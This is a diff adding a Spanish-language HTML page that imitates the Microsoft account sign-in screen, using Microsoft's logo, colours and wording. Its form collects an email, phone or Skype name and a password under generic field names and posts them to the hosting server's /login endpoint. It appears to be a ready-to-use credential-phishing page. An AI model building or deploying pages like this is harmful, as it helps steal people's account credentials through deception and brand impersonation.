@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Iniciar sesi&oacute;n en su cuenta</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Segoe UI","SegoeUI","Helvetica Neue",Helvetica,Arial,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.container{background:#fff;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);width:100%;max-width:440px}
+.logo{display:flex;align-items:center;gap:8px;margin-bottom:16px}
+.logo-icon{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:21px;height:21px}
+.logo-icon span:nth-child(1){background:#f25022}
+.logo-icon span:nth-child(2){background:#7fba00}
+.logo-icon span:nth-child(3){background:#00a4ef}
+.logo-icon span:nth-child(4){background:#ffb900}
+.logo-text{font-size:15px;color:#242424;font-weight:600}
+h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
+.subtitle{color:#1b1b1b;font-size:15px;margin-bottom:16px}
+.form-group{margin-bottom:16px}
+.form-group input{width:100%;padding:6px 12px;border:1px solid #8a8886;font-size:15px;color:#1b1b1b;background:#fff}
+.form-group input:focus{outline:none;border-color:#0067b8;border-bottom:2px solid #0067b8}
+.form-group input::placeholder{color:#666}
+.btn{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;font-weight:600;cursor:pointer;min-width:108px;float:right}
+.btn:hover{background:#106ebe}
+.links{margin-top:24px;font-size:13px}
+.links a{color:#0067b8;text-decoration:none}
+.links a:hover{text-decoration:underline}
+.create{margin-top:16px;font-size:13px;color:#1b1b1b}
+.create a{color:#0067b8;text-decoration:none;font-weight:600}
+.signin-options{margin-top:24px;font-size:13px}
+.signin-options a{color:#0067b8;text-decoration:none}
+@media(max-width:480px){.container{padding:24px}}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo">
+<div class="logo-icon"><span></span><span></span><span></span><span></span></div>
+<span class="logo-text">Microsoft</span>
+</div>
+<h1>Iniciar sesi&oacute;n</h1>
+<p class="subtitle">Para continuar, inicia sesi&oacute;n o crea una cuenta.</p>
+<form action="/login" method="POST">
+<div class="form-group">
+<input type="text" name="field1" placeholder="Correo electr&oacute;nico, tel&eacute;fono o Skype" required autocomplete="off">
+</div>
+<div class="form-group">
+<input type="password" name="field2" placeholder="Contrase&ntilde;a" required autocomplete="off">
+</div>
+<div style="overflow:hidden">
+<button type="submit" class="btn">Iniciar sesi&oacute;n</button>
+</div>
+</form>
+<div class="signin-options">
+<a href="#">&iquest;No puedes acceder a tu cuenta?</a>
+</div>
+<div class="links">
+<a href="#">Opciones de inicio de sesi&oacute;n</a>
+</div>
+<div class="create">&iquest;No tienes una cuenta? <a href="#">Crear una</a></div>
+</div>
+</body>
+</html>
